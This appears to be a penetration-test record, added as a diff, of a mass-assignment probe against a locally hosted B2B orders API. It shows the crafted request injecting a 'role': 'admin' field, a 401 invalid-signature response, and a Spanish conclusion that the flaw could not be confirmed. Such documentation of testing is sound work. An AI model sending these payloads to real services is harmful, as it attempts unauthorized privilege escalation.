@@ -1,0 +1,45 @@
+========================
+V-05 - MASS ASSIGNMENT
+========================
+
+REQUEST
+
+POST /b2b/v2/orders HTTP/1.1
+Host: 127.0.0.1:3000
+Authorization: Bearer <JWT oculto>
+Content-Type: application/json
+
+{
+  "cid": "JS0815DE",
+  "role": "admin",
+  "orderLines": [
+    {
+      "productId": 8,
+      "quantity": 500,
+      "customerReference": "PO0000001"
+    }
+  ],
+  "orderLinesData": "[{\"productId\":12,\"quantity\":10000,\"customerReference\":[\"PO0000001.2\",\"SM20180105|042\"],\"couponCode\":\"pes[Bh.u*t\"},{\"productId\":13,\"quantity\":2000,\"customerReference\":\"PO0000003.4\"}]"
+}
+
+----------------------------------------
+
+RESPONSE
+
+HTTP/1.1 401 Unauthorized
+
+{
+  "error": {
+    "message": "invalid signature",
+    "name": "UnauthorizedError",
+    "code": "invalid_token",
+    "status": 401,
+    "inner": {}
+  }
+}
+
+----------------------------------------
+
+RESULTADO
+
+La prueba no pudo validar la existencia de una vulnerabilidad de Mass Assignment debido a que la API rechazó la autenticación antes de procesar el cuerpo de la solicitud.
